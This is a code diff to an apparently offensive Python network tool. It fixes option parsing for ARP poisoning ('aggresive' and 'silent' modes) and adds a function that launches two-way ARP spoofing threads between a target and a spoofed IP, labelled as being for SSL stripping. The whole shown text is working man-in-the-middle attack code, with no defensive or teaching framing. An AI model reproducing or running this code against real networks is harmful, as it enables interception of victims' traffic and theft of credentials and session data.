@@ -27,13 +27,13 @@ def start_arp_poison(cmd):
         elif arg == "-spip" and i + 1 < len(args):
             iptospoof = args[i + 1]
         elif arg == "-mode" and i + 1 < len(args):
-			mode = args[i + 1]
-			if mode == "aggresive":
-				interval = 1
-			elif mode == "silent":
-				interval = 10
+            mode = args[i + 1]
+            if mode == "aggresive":
+                interval = 1
+            elif mode == "silent":
+                interval = 10
     if not ip or not iptospoof:
-        print("[!] Usage: arp_poison -tgtip <target_ip> -spmac <target_mac> -spip <spoofed_ip>")
+        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
         return
     print("[*] Spoofing %s as %s..." % (ip, iptospoof))
 
@@ -41,6 +41,27 @@ def start_arp_poison(cmd):
     arp_thread.daemon = True
     arp_thread.start()
 
+# ARP poisoning for SSL stripping
+def start_arp_poison_ssl(cmd):
+    args = shlex.split(cmd)
+    ip = iptospoof = None
+    for i, arg in enumerate(args):
+        if arg == "-tgtip" and i + 1 < len(args):
+            ip = args[i + 1]
+        elif arg == "-spip" and i + 1 < len(args):
+            iptospoof = args[i + 1]
+    if not ip or not iptospoof:
+        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
+        return
+    print("[*] Spoofing %s as %s ..." % (ip, iptospoof))
+
+    arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, iptospoof))
+    arp_thread.daemon = True
+    arp_thread.start()
+
+    arp_thread = threading.Thread(target=arp_spoof_loop, args=(iptospoof, ip))
+    arp_thread.daemon = True
+    arp_thread.start()
 
 # Starts a thread that performs ARP spoofing sending a limited number of packets.
 def start_arp_thread(target_ip, spoofed_ip, count):
